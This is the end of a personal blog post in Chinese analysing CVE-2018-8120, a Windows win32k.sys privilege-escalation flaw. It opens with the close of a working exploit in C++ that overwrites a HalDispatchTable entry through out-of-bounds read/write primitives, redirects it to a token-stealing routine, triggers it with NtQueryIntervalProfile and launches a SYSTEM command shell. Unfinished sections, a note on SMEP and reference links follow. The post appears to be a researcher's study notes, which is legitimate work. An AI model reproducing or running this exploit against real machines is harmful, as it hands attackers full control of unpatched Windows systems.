	<span class="n">ReadOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldHalEntry</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] oldHalEntry: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">oldHalEntry</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">GetSystemToken</span><span class="p">;</span>
	<span class="c1">//getchar();</span>
	<span class="n">WriteOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
	<span class="n">_NtQueryIntervalProfile</span> <span class="n">NtQueryIntervalProfile</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">Interval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">NtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span><span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
	<span class="n">NtQueryIntervalProfile</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Interval</span><span class="p">);</span>
	<span class="n">WriteOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldHalEntry</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"cmd"</span><span class="p">);</span>
	<span class="c1">//getchar();</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="通过覆盖palette对象实现任意地址读写">通过覆盖Palette对象实现任意地址读写</h3>

<p>// to do</p>

<p>也可以通过其他方式劫持执行流</p>

<h3 id="通过劫持窗口对象lpfnwndproc成员执行用户代码">通过劫持窗口对象lpfnWndProc成员执行用户代码</h3>

<p>// to do</p>

<h3 id="smep">SMEP</h3>

<p>可以通过微软的<code class="language-plaintext highlighter-rouge">Coreinfo.exe</code> 工具查看电脑保护情况.</p>

<p>为<code class="language-plaintext highlighter-rouge">*</code>则代表开启, 为<code class="language-plaintext highlighter-rouge">-</code>则代表未开启.</p>

<p><code class="language-plaintext highlighter-rouge">SMEP</code> 由<code class="language-plaintext highlighter-rouge">Cr3</code> 寄存器控制</p>

<p>比较疑惑的是使用的<code class="language-plaintext highlighter-rouge">win7</code>虚拟机显示开启了<code class="language-plaintext highlighter-rouge">smep</code>，但是也可以直接返回用户层代码利用成功。</p>

<h2 id="参考文章">参考文章</h2>

<p><a href="https://021w.github.io/2021/02/24/CVE-2018-8120win32k-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2018-8120win32k.sys内核漏洞分析</a></p>

<p><a href="https://www.freebuf.com/vuls/174182.html">关于CVE-2018-8120 之最新Windows提权漏洞分析 - FreeBuf网络安全行业门户</a></p>

<p><a href="https://www.cnblogs.com/DreamoneOnly/p/11444172.html">CVE-2018-8120</a></p>

  </div><a class="u-url" href="/windows/2021/05/14/cve-2018-8120.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">ln3&#39;s blog</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">ln3&#39;s blog</li><li><a class="u-email" href="mailto:1816154@gmail.com">1816154@gmail.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/golbeze"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">golbeze</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>binary noob
</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
